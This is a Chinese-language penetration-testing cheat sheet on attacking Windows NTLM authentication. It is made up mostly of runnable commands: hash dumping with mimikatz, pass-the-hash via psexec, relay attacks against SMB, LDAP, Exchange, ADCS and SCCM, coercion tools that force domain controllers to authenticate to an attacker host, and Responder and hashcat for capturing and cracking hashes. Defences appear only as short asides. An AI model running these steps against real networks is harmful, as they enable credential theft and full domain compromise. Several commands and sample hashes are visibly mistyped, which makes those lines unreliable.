# NTLM攻击面

## PTH（Pass-the-Hash）攻击

### 攻击方式

#### 获取NTLM值

- 条件：获取**SYSTEM权限**或**完全管理员权限**

- 使用**mimikatz**获取NTLM值

```shell
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
```

#### 使用psexec进行PTH攻击

```shell
python3 psexec.py ad12/administrator@192.168.100.98 -hashes aad3b435b51404eeaad3b435b51404ee:5101be4f92e58e418708alab90cafd9
```

### 防御方式

- **KB2871997**补丁

## NTLM Relay 攻击

![](../images/NTLM-Relay.jpg)

### NTLM Relay - SMB

#### 攻击方式

- 检测目标机器是否开启**smb签名**，若显示**message_signing: required**则无法攻击

```shell
nmap --script smb-security-mode.nse -p445 IP或网段 --open
```

- 攻击机开启**smbrelayx**监听

```shell
python3 smbrelay.py -h 受害机IP(SMB服务器) -c 命令
```

- 使用**强制认证漏洞**

#### 防御方式

- 开启**SMB签名**
  - 本地安全策略→安全设置→本地策略→安全选项→Microsoft 网络服务器：总是进行服务器消息块 (SMB) 签名

### NTLM Relay - LDAP

| 高权限用户              | 敏感ACL                        |
| ----------------------- | ------------------------------ |
| Enterprise admins       | DS-Replication-GetChanges      |
| Domain admins           | DS-Replication-Get-Changes-All |
| Built-in Administrators |                                |
| Backup operators        |                                |
| Account operators       |                                |

#### 攻击方式

- 攻击机开启**ntlmrelayx**进行监听

```shell
python3 ntlmrelayx.py --remove-mic --escalateuser 用户名 -t ldap://受害机IP -smb2support
```

	--remove-mic参数用于消除MIC
	--escalate-user参数用于给指定用户DcSync权限

- 使用**强制认证漏洞**

#### 防御方式

- 开启**ldap签名**
  - 本地安全策略→安全设置→本地策略→安全选项→网络安全:LDAP客户端签名要求

### NTLM Relay - Exchange

#### 攻击方式

- 检测**Exchange服务器**是否开启**NTLM认证**

```shell
python exchangeRelayx.py -c -t https://ExchangeIP
```

- 攻击机开启**exchangeRelayx**监听

```shell
python exchangeRelayx.py -t https://ExchangeIP
```

- 钓鱼攻击，发送**钓鱼邮件**使用用户访问恶意连接触发认证

### NTLM Relay - ADCS

#### 攻击方式

- 查看**ADCS服务器**是否开启**NTLM认证**，若返回结果为**WWW-Authenticate: NTLM**则开启NTLM认证

```
curl ADCS服务器IP/certsrv/ -I
```

- 攻击机开启**ntlmrelayx**的**adcs**监听

```shell
python3 ntlmrelayx.py -debug -smb2support --targethttp://ADCS服务器IP/certsrv/certfnsh.asp --adcs --template DomainController
```

- 使用**强制认证漏洞**
- 获取到证书后使用**Rubeus**请求票据

```shell
Rubeus.exe asktgt /user:DCS /certificate:打印出来的base64证书数据 /ptt
```

### NTLM Relay - SCCM

#### 利用条件

1. 我们所在的主机是SCCM客户端
2. SCCM管理点服务器的FQDN或NetBIOS名称
3. SCCM站点的站点代码

#### 攻击方式

- 判断当前主机是否在**SCCM客户端**中，若执行以下命令有输出，则说明在客户端中

```shell
SharpSCCM.exe local siteinfo
```

- 查看当前用户的角色

```shell
SharpSCCM.exe <server> <sitecode> get class-instances SMS Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames
```

- 查找能捕获NTLM的机器和账户

```shell
SharpSCCM.exe <server> <sitecode> get primary-user -u <username>
```

- 攻击机开启**ntlmrelayx**的**sccm**监听

```shell
ntlmrelayxpy -smb2support -ts -ip <relay _ip> -t <target ip> -of ~/hashes.txt
```

- 触发**sccm认证**

```shell
SharpSCCM.exe <server> <sitecode> exec -d <device name> -r <relay server ip>
```

#### 防御方式

- 在**SCCM管理点服务器**取消勾**允许连接回退到 NTLM(N)**
  - 站点配置→站点属性→通信→客户端通信→客户端回退到 NTLM(N)

### 强制认证漏洞

#### 域控强制认证

##### Coercer - 一箭四雕（推荐）

```shell
python3 Coercer.py -u username -p password -d ad.com -l 攻击机IP -t 辅域控IP -v
```

###### PrinterBug

- 使用**printerbug**触发辅域控进行强制认证

```shell
ython3 printerbug.py ad.com/username:password@辅域控IP 攻击机IP
```

###### PetitPotam

- 使用**PetitPotam**触发辅域控进行强制认证

```shell
python3 PetitPotam.py 攻击机IP 辅域控IP
```

###### DFSCoerce

- 使用**dfscoerce**触发辅域控进行强制认证

```shell
python3 dfscoerce.py -u username -p password -d ad.com 攻击机IP 辅域控IP
```

###### ShadowCoerce

- 使用**shadowcoerce**触发辅域控进行强制认证

```shell
python3 shadowcoerce.py -u username -p password -d ad.com 攻击机IP 辅域控IP
```

#### Exchange强制认证

##### PrivExchange

- 使用**privexchange**触发**Exchange服务器**进行强制认证

```shell
python3 privexchange.py -u username -p password -d ad.com -ah 攻击机IP Exchange服务器IP
```

## 其他

### NTLM Info

- 使用**NTLM协议**对目标服务器进行**信息收集**

```shell
./ntlminfo smb --host 192.168.12.249
./ntlminfo rpc --host 192.168.12.249
./ntlminfo ldap --host 192.168.12.249
```

### Net-NTLM V1破解

- 攻击机开启**Responder**监听

```shell
python2 Responder.py -I eth0 -v --lm
```

- 受害机执行命令

```shell
net use \攻击机IP\aaa
```

- 使用**crack.sh网站**进行破解

### Net-NTLM V2破解

- 获取以下两个数据包

```
Rsponse, Error: STATUS_MORE_ROCESSING_REQUIRED, NTLMSSP_CHALLENGE
Rquest, NTLMSSP_AUTH, User: ad12\administrator
```

- 查看第一个数据包的**NTLM Server Challenge**的值

```
NTLM Server Challenge: 89d90c3455fa25fo
```

- 查看第二个数据包，获取**Domain name**、**user name**、**NTProofStr（HMAC-MD5）**的值

```
Domain name: ad12
user name: administrator
NTProofstr: b07b59c33b3cd56774a7dcgf8dc2ff47
```

- 拼接**NTLMv2 HASH**

```
username::domain:challenge:HMAC-MD5:blob
```

- 使用**hashcat**进行破解

```shell
hashcat -m 5600 username::domain:challenge:HMAC-MD5:blob password.list -o result.txt --force
```

